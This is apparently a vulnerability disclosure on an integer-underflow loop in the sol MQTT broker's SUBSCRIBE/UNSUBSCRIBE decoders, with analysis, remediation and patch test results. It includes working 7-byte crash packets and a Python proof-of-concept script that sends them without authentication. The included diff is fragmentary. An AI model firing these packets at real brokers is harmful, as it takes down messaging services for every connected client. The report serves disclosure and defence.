# Non-terminating SUBSCRIBE/UNSUBSCRIBE tuple loops: unsigned underflow lets one 7-byte pre-auth packet crash or exhaust the broker

**ID:** vuln-0005
**Severity:** HIGH
**Found:** 2026-11-17 10:19:53 UTC
**Target:** sol MQTT broker, source snapshot (repository /workspace/source)
**Endpoint:** MQTT SUBSCRIBE (0x82) and UNSUBSCRIBE (0xA2) packet decoders
**Method:** TCP
**CWE:** CWE-191
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

Both the SUBSCRIBE and the UNSUBSCRIBE decoders walk their payload in a loop whose counter is the sender-declared packet length, and they subtract the declared topic length from it before checking that those bytes are actually present. Declaring a topic longer than the packet wraps the counter to about 2^64, so the loop never terminates: it keeps reallocating and allocating memory and keeps copying from beyond the end of the connection's read buffer. A single unauthenticated 7-byte packet kills the shipped build with SIGSEGV in about 0.2 s; with a larger read buffer it instead grows resident memory by roughly 900 MB in half a second while pinning a worker thread at full CPU, and the process no longer honours SIGTERM.

## Impact

An unauthenticated network peer needs one TCP connection and 7 bytes - no CONNECT, no credentials - to take the broker down. On a build with the project's production flags the whole process dies with SIGSEGV within a fraction of a second (denial of service for every connected client). With the shipped 512 KB / 1 MB read-buffer configuration, and on builds where the allocator keeps up, the same packet instead produces an unbounded loop: resident memory grew from 52 MB to 965 MB within 0.5 s while one of the two event-loop threads stayed at ~95 % CPU, the connection stayed open, no diagnostic was produced, and the process ignored SIGTERM. In that state roughly half of the broker's event-loop capacity is lost permanently per malicious connection, and further connections exhaust memory until the process is killed. The same loop copies topic bytes from beyond the end of the read buffer, so callers that do not crash first perform unbounded out-of-bounds heap reads.

## Counterevidence

The strongest case against the finding would be that the packet is rejected before the loop, that the loop is bounded by a check not visible at the call site, or that the crash is an artefact of instrumentation. None holds: the decoder receives `len = c->read - c->rpos` from `src/server.c:865` with no field validation anywhere upstream, the value evidenced in the faulting frame (`len=18446744073707446302`) is the wrapped counter rather than a bounded one, and the SIGSEGV was reproduced on a separate build using the project's production flags with no sanitizer, no stack protector and no test harness attached. The one genuine constraint is that the fault location moves with the allocator and buffer size: with a large buffer the loop can run long enough to look like a hang rather than a crash, and under an instrumented allocator it can be slowed enough that no report appears within a minute. That changes the observable symptom (crash versus CPU/memory exhaustion), not the reachability or the correctness of the trigger, and both symptoms are denial of service. A fair weaker reading is that confidentiality and integrity impact are not demonstrated: the out-of-bounds reads copy heap bytes into freshly allocated topic strings that are never returned to the attacker, which is why both are scored as none.

## What Would Change This Severity

Nothing would lower this below high: the packet is 7 bytes, unauthenticated and deterministic, and the process loss was reproduced on the project's own production flags. It would rise to critical only if the loop's out-of-bounds reads were shown to return heap contents to the attacker or to steer the walk towards a writable target, neither of which is demonstrated.

## Technical Analysis

The two decoders in `src/mqtt.c` consume the variable header and payload with a loop counter (`len`, a `usize`) that is the sender-declared Remaining Length. Every subtraction happens before the corresponding availability test, and the declared topic length is taken straight from the wire:

```c title=src/mqtt.c startLineNumber=341 endLineNumber=358
    usize i = 0;
    for (; len > 0; ++i) {
        /* Read length bytes of the first topic filter */
        len -= sizeof(u16);

        /* We have to make room for additional incoming tuples */
        subscribe.tuples =
            try_realloc(subscribe.tuples, (i + 1) * sizeof(*subscribe.tuples));
        subscribe.tuples[i].topic_len =
            unpack_string16(&buf, &subscribe.tuples[i].topic);

        if (!subscribe.tuples[i].topic)
            goto err;

        len -= subscribe.tuples[i].topic_len;
        subscribe.tuples[i].qos = unpack_integer(&buf, 'B');
        len -= sizeof(u8);
    }
```

`unpack_mqtt_unsubscribe` (`src/mqtt.c:386-401`) has the identical shape with a 2-tuple. `topic_len` is the u16 that `unpack_string16` has just read from the packet (`src/pack.c:420-425`), so the value subtracted at `src/mqtt.c:355` / `:400` is entirely attacker-controlled and is never compared with what is left of the packet.

With the 7-byte SUBSCRIBE `82 05 00 01 00 FF 41` the pre-loop bookkeeping leaves `len = 1` (`Remaining Length 5`, minus the 2-byte packet identifier, minus the 2-byte topic length). The declared topic length is `0x00FF = 255`, so `len = 1 - 255 = 18446744073709551362`, and `len > 0` remains true for ~2^64 iterations. The same packet with opcode `0xA2` reaches the identical arithmetic in `unpack_mqtt_unsubscribe`.

Each iteration of the resulting loop has three effects:

1. `try_realloc(subscribe.tuples, (i + 1) * sizeof(*subscribe.tuples))` grows the tuple array by 16 bytes per iteration, without bound and without regard to `max_memory`.
2. `unpack_string16` allocates `topic_len + 1` bytes and copies `topic_len` bytes from `buf`, which advances by `2 + topic_len` (+1 for the QoS byte) per iteration, so the copy source leaves the per-client read buffer (`client->rbuf`, allocated with exactly `max_request_size` bytes at `src/server.c:392-394`) after about `max_request_size / 3` iterations and keeps walking the heap.
3. Nothing is ever freed on this path: the tuple array and every topic string stay live, so resident memory grows by roughly `topic_len + 16` bytes per iteration.

The only exit from the loop is `if (!subscribe.tuples[i].topic) goto err;`, which is dead code because `unpack_bytes` (`src/pack.c:411-418`) calls `exit(EXIT_FAILURE)` on allocation failure instead of returning NULL.

Two smaller weaknesses in the same arithmetic: `src/mqtt.c:332` / `:377` subtract the 2-byte packet identifier before any check that `len >= 2`, and `subscribe.tuples_len = i` truncates an unbounded iteration count into a u16.

The pattern is present in the initial commit of the file (`git blame src/mqtt.c -L 342,357` attributes every line to `373d848`, 2024-12-12) and no later change bounded the loop.

Control analysis: `recv_packet` limits only the *total* advertised packet to `max_request_size` (`src/server.c:551`); it never validates a field length against the bytes present. `unpack_string16` does not compare its declared length with the remaining packet length. Decoding happens in `process_message` (`src/server.c:865`) before any CONNECT or credential check, so the defect is reachable pre-authentication regardless of the `allow_anonymous` / `password_file` configuration.

## Proof of Concept

1. Build the broker from the snapshot twice: once with the project's production flags and once with AddressSanitizer/UBSan instrumentation for the memory-access view.
2. Start an instance bound to 127.0.0.1 with `max_request_size 1MB` (the shipped-style configuration), and a second instance with `max_request_size 4096` so the read buffer is small.
3. Open one TCP connection to the listening port and send the seven bytes `82 05 00 01 00 FF 41`. Do not send a CONNECT packet and do not authenticate.
4. Against the production-flags instance, observe the process disappear within ~0.2 s (client sees EOF, exit status -11/SIGSEGV); a core dump shows the fault in `unpack_integer` reached from `unpack_string16` inside `unpack_mqtt_subscribe` with `len = 18446744073707446302`.
5. Repeat step 3 with the seven bytes `A2 05 00 01 00 FF 41`; the fault moves one call site over, into `unpack_mqtt_unsubscribe` with the same wrapped `len`.
6. Against the 4 KiB Read-buffer instance, observe the AddressSanitizer report `heap-buffer-overflow READ of size 1` at `src/pack.c:91` (`unpacku16`) reached from `unpack_mqtt_subscribe` at `src/mqtt.c:350`, about 0.2 s after the packet is sent - the loop has walked off the read buffer.
7. Against the 1 MB instance, sample `/proc/<pid>/status` and `/proc/<pid>/stat` for six seconds: resident memory climbs from ~52 MB to ~950 MB within the first 0.5 s while the process accumulates CPU time on one thread, no sanitizer report is produced, the connection stays open, and SIGTERM is not honoured within four seconds.
8. Confirm the packet is not merely a publishing-without-CONNECT artefact: the same broker keeps serving other clients normally until the looping packet arrives.

````python
#!/usr/bin/env python3
"""PoC: non-terminating SUBSCRIBE / UNSUBSCRIBE tuple loop (usize underflow).

usage: SOL_BIN=/path/to/sol python3 poc_tuple_loop.py [sub|unsub] [max_request_size]
"""
import os
import shutil
import signal
import socket
import subprocess
import sys
import time

BIN = os.environ.get("SOL_BIN", "/usr/local/bin/sol")
PORT = int(os.environ.get("SOL_PORT", "19400"))
MAXREQ = os.environ.get("SOL_MAXREQ", "1MB")
DIR = "/tmp/sol-poc-tuple-loop"

PACKETS = {
    # SUBSCRIBE  (0x82) RL=5, pkt_id=0x0001, topic_len=0x00FF, 1 byte sent
    "sub": b"\x82\x05\x00\x01\x00\xFF\x41",
    # UNSUBSCRIBE (0xA2), identical shape
    "unsub": b"\xa2\x05\x00\x01\x00\xFF\x41",
}


def start_broker():
    shutil.rmtree(DIR, ignore_errors=True)
    os.makedirs(DIR)
    conf = os.path.join(DIR, "sol.conf")
    with open(conf, "w") as fh:
        fh.write("ip_address 127.0.0.1\n"
                 "ip_port %d\n"
                 "log_level DEBUG\n"
                 "log_path %s/sol.log\n"
                 "max_memory 512MB\n"
                 "max_request_size %s\n"
                 "allow_anonymous true\n" % (PORT, DIR, MAXREQ))
    out = open(os.path.join(DIR, "broker.out"), "wb")
    proc = subprocess.Popen([BIN, "-c", conf], stdout=out,
                            stderr=subprocess.STDOUT, cwd=DIR,
                            env=dict(os.environ,
                                     ASAN_OPTIONS="abort_on_error=1:detect_leaks=0"
                                     ":print_stacktrace=1:symbolize=1"),
                            start_new_session=True)
    for _ in range(200):
        if proc.poll() is not None:
            raise SystemExit("broker exited during startup")
        try:
            socket.create_connection(("127.0.0.1", PORT), timeout=0.5).close()
            return proc
        except OSError:
            time.sleep(0.05)
    raise SystemExit("broker did not listen on 127.0.0.1:%d" % PORT)


def main():
    variant = sys.argv[1] if len(sys.argv) > 1 else "sub"
    pkt = PACKETS[variant]
    print("binary        :", BIN)
    print("max_request_sz:", MAXREQ)
    print("packet        :", " ".join("%02X" % b for b in pkt),
          "(%d bytes, no CONNECT)" % len(pkt))
    proc = start_broker()
    print("broker pid    :", proc.pid)
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=3)
        t0 = time.monotonic()
        s.sendall(pkt)

        def rss():
            try:
                with open("/proc/%d/status" % proc.pid) as fh:
                    for line in fh:
                        if line.startswith("VmRSS:"):
                            return int(line.split()[1])
            except OSError:
                return None

        def cpu():
            try:
                with open("/proc/%d/stat" % proc.pid) as fh:
                    f = fh.read().split()
                return int(f[13]) + int(f[14])
            except (OSError, IndexError):
                return None

        samples = []
        while time.monotonic() - t0 < 6.0 and proc.poll() is None:
            samples.append((round(time.monotonic() - t0, 2), rss(), cpu()))
            time.sleep(0.1)
        print("elapsed       : %.2f s" % (time.monotonic() - t0))
        print("rss/cpu ticks :", samples[:8], "...", samples[-3:])
        print("alive after 6s:", proc.poll() is None,
              "exit:", proc.poll())
        if proc.poll() is None:
            proc.send_signal(signal.SIGTERM)
            t1 = time.monotonic()
            while time.monotonic() - t1 < 4 and proc.poll() is None:
                time.sleep(0.1)
            print("ignored SIGTERM:", proc.poll() is None)
        s.close()
        print("--- broker output ---")
        print(open(os.path.join(DIR, "broker.out"), errors="replace").read()[-1500:])
    finally:
        if proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except OSError:
                pass


if __name__ == "__main__":
    main()
```
````

```diff
-     mqtt_unpack(c->rbuf + c->rpos, &io.data, *c->rbuf, c->read - c->rpos);
-     c->toread = c->read = c->rpos = 0;
-     c->rc = handle_command(io.data.header.bits.type, &io);

+      * A packet that could not be decoded must not reach the command handlers,
+      * they assume a fully populated packet: reset the client state machine and
+      * wait for the next one instead
```

## Remediation

1. Validate the remaining length before every subtraction in both tuple loops: reject the packet when fewer than the 2-byte topic length plus the 1-byte QoS level (SUBSCRIBE) or fewer than the 2-byte topic length (UNSUBSCRIBE) remain, and reject it again when the declared topic length exceeds what is left after the topic length field has been consumed. Reject before reading the packet identifier when the declared length cannot hold it plus at least one complete tuple.
2. Make the loop counter itself trustworthy: derive each iteration's bound from the bytes actually present in the packet rather than from the declared length alone, and fail closed on any packet whose contents do not exactly match its declared length.
3. Remove the unreachable error branch or make the allocation helper return an error instead of terminating the process, so that a decode failure costs one connection rather than the whole broker.
4. Reject and discard decoded packets that failed validation: the caller currently ignores the decoder's return code and dispatches the partially populated packet to the command handlers, which then operate on an empty tuple list.
5. Bound the tuple count to the 16-bit field that stores it, and free the tuples already decoded when validation fails so that malformed packets cannot leak memory.
6. Apply the same availability-before-subtraction rule to the remaining length arithmetic in the PUBLISH and CONNECT decoders, which use the same pattern.
7. Add regression tests that feed each decoder truncated and length-inconsistent packets and assert a clean protocol error plus a live broker process.

Trace through the patched code: `unpack_mqtt_subscribe` first rejects `len < 5`; with `len = 5` the first iteration finds `len = 3` after the packet id, subtracts the 2-byte topic length (`len = 1`), reads `topic_len = 255`, and the new test `topic_len > len` frees the topic and returns `-MQTT_ERR` without touching the loop counter again, so `len` can never wrap. `process_message` now consumes that return value, resets the client state machine and returns before `handle_command`, so the partially decoded packet is never dispatched (this also closed a variable-length-array-of-size-zero path in `subscribe_handler` that a zero-tuple SUBSCRIBE previously reached).

**Gate 4 - preserved behaviour (executed).** `python3 test_smoke.py --port <patched instance>` reports `RESULT: 8/9` for both the production-flags and the sanitizer build, with CONNECT, SUBSCRIBE/SUBACK, cross-connection PUBLISH delivery, PINGREQ/PINGRESP, DISCONNECT and post-run liveness all passing. The single failure is `broker logged the connections`, which fails identically on the unpatched binary because the broker's log file is block-buffered while the process runs; after a clean shutdown of the patched instance the same log file contains the client identifiers, confirming the log path itself is intact. In addition, an explicit functional test run against the patched sanitizer build passes: a 3-tuple SUBSCRIBE returns a SUBACK with three granted QoS entries, all three subscriptions deliver their published message, and a SUBSCRIBE whose declared length does not cover its last tuple is rejected while a second client continues to be served.

**Gap.** A valid multi-tuple UNSUBSCRIBE could not be exercised end-to-end on either build: the handler destroys the decoded packet and `process_message` destroys it a second time (a separate pre-existing defect), so the process aborts downstream of the decoder. Comparison against the unpatched binary shows the identical `free(): double free detected in tcache 2` outcome for the same packet, i.e. the patched decoder produces exactly the same downstream behaviour as before and the decoder change is not implicated.

## Assumptions

A single TCP connection to the broker's listening port is available to the attacker and authentication is not a prerequisite for packet decoding, which is the case here: `process_message` decodes the packet before the CONNECT handler evaluates `allow_anonymous` or the password file, and the module under test does not check `c->connected` for SUBSCRIBE / UNSUBSCRIBE. The attacker sends 7 bytes and needs no knowledge of the broker's configuration. The observed outcome depends on the read-buffer size and allocator speed: with the shipped 512 KB / 1 MB settings the loop is an availability/exhaustion issue, and it becomes an immediate crash once the walk reaches an unmapped page (observed with the project's own production build and with smaller buffers).
